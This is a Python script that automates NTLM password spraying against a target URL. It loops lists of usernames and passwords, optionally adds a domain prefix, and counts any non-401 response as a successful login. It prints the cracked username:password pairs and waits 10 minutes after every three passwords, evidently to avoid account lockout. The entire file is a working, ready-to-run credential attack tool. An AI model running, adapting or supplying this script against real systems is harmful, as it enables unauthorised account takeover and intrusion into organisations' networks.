#!/usr/bin/env python3
import argparse
import requests
import time
import sys
from requests_ntlm import HttpNtlmAuth
from colorama import init, Fore, Style

# Initialize colorama (auto-reset colors after each print)
init(autoreset=True)


def load_list(file_path):
    """Read lines from a file and return a list of non-empty stripped strings."""
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(Fore.RED + f"Error reading {file_path}: {e}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="NTLM Authentication Brute-Force Automation Script"
    )
    parser.add_argument(
        '--url',
        required=True,
        help="Target URL (e.g., https://target.url)"
    )
    parser.add_argument(
        '--userfile',
        required=True,
        help="Path to file containing list of usernames (one per line)"
    )
    parser.add_argument(
        '--passfile',
        required=True,
        help="Path to file containing list of passwords (one per line)"
    )
    parser.add_argument(
        '--domain',
        help="Domain for NTLM authentication (e.g., DOMAIN). If provided, it will be prefixed to usernames that do not already include a domain."
    )
    args = parser.parse_args()

    url = args.url
    users = load_list(args.userfile)
    passwords = load_list(args.passfile)

    if not users:
        print(Fore.RED + "No users found in the provided user file.")
        sys.exit(1)
    if not passwords:
        print(Fore.RED + "No passwords found in the provided password file.")
        sys.exit(1)

    # Dictionary to hold successful username:password combinations
    successful = {}

    # Cycle settings:
    passwords_per_cycle = 3  # Group 3 passwords per cycle
    cycle_count = 0  # Cycle counter

    print(Style.BRIGHT + Fore.CYAN + "\n=== Starting NTLM Brute-Force Attempts ===\n")

    # Iterate through the passwords list in groups (cycles) of three.
    for i in range(0, len(passwords), passwords_per_cycle):
        # Get the next group of passwords.
        current_cycle = passwords[i:i + passwords_per_cycle]
        cycle_count += 1
        print(
            Style.BRIGHT + Fore.CYAN + f"=== Cycle {cycle_count}: Testing passwords: {', '.join(current_cycle)} ===\n")

        # For each password in this cycle…
        for password in current_cycle:
            print(Style.BRIGHT + Fore.CYAN + f"--- Attempting password: {password} ---")
            # Loop over a *copy* of the users list so we can remove successful ones
            for user in list(users):
                # Apply domain if provided and not already in the username.
                if args.domain and '\\' not in user:
                    user_with_domain = f"{args.domain}\\{user}"
                else:
                    user_with_domain = user

                # Print the guess in dark gray.
                guess_msg = f"[*] - {url} - Trying login - {user_with_domain}:{password}"
                print(Fore.LIGHTBLACK_EX + guess_msg)

                try:
                    # Create a new session for each attempt (you can also reuse a session)
                    session = requests.Session()
                    session.auth = HttpNtlmAuth(user_with_domain, password)
                    response = session.get(url, timeout=10)

                    # A non-401 response is considered a success.
                    if response.status_code != 401:
                        success_msg = f"[*] - {url} - Login SUCCESS - {user_with_domain}:{password}"
                        print(Fore.GREEN + success_msg)
                        successful[user_with_domain] = password
                        # Remove user so that further attempts aren’t made.
                        users.remove(user)
                    else:
                        fail_msg = f"[*] - {url} - Login FAILED - {user_with_domain}:{password}"
                        print(Fore.LIGHTBLACK_EX + fail_msg)
                except Exception as e:
                    print(Fore.RED + f"Error attempting login for {user_with_domain}:{password} - {e}")

            print(Fore.LIGHTBLACK_EX + f"Completed processing for password: {password}\n")

        # End of the current cycle – display cumulative successes.
        print(Style.BRIGHT + Fore.YELLOW + f"Cycle {cycle_count} complete. Cumulative successes so far:")
        if successful:
            for user, pwd in successful.items():
                print(Fore.GREEN + f"{user}:{pwd}")
        else:
            print(Fore.YELLOW + "None")

        print(Style.BRIGHT + Fore.YELLOW + "Pausing for 10 minutes before next cycle...\n")
        time.sleep(600)  # Pause for 10 minutes (600 seconds)

        # If all users have been authenticated successfully, exit early.
        if not users:
            print(Fore.GREEN + "All users have been successfully authenticated. Exiting.")
            return

    print(Style.BRIGHT + Fore.CYAN + "Finished processing all passwords. Exiting.")


if __name__ == '__main__':
    main()
